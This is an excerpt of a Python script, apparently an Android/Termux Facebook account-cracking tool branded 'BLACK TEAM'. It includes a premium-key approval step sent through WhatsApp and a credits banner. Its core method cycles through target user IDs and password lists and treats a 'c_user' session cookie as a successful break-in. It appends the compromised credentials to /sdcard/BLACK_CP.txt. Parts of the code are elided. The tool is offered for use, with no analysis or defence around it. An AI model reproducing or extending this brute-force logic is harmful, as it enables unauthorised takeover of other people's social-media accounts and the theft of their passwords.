...
def main_apv():
    ...
    try:
        ...
        tks = 'Dear%20Black,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt

        os.system('am start https://wa.me/+93787389807?text=' + tks)
    ...
    if key1 in r1:
        ...
        tks = 'Dear%20Black,%20Please%20Apporved%20My%20Key%20To%20Premium✓✓%20%20%20%20%20My%20%20Key%20%20:%20'+ak+''+key1
...
\____/\_____/\_| |_/\____/\_| \_/
 ...
 [$]*****************************************************[$]
   \x1b[1;92m╔═════════════════════════════╗
   \x1b[1;92m║ TOOL NAME : { BLACK TEAM }   ║
   \x1b[1;92m║ AUTHOR    : BLACK TEAM      ║
   \x1b[1;92m║ GITHUB    : git.me/AfghanHack001 ║
   \x1b[1;92m║ FACEBOOK  : ...............   ║
   \x1b[1;92m║ Group     : BLACK TEAM ║
...
def R():
			...
			if key in [""]:
				...
				os.system("xdg-open https://facebook.com/groups/355390177935496/")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[BLACK]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        open('/sdcard/BLACK_CP.txt' , 'a').write('%s\n' % wrt)
...
def yt():
	...
	os.system("xdg-open https://www.facebook.com/BLACK")
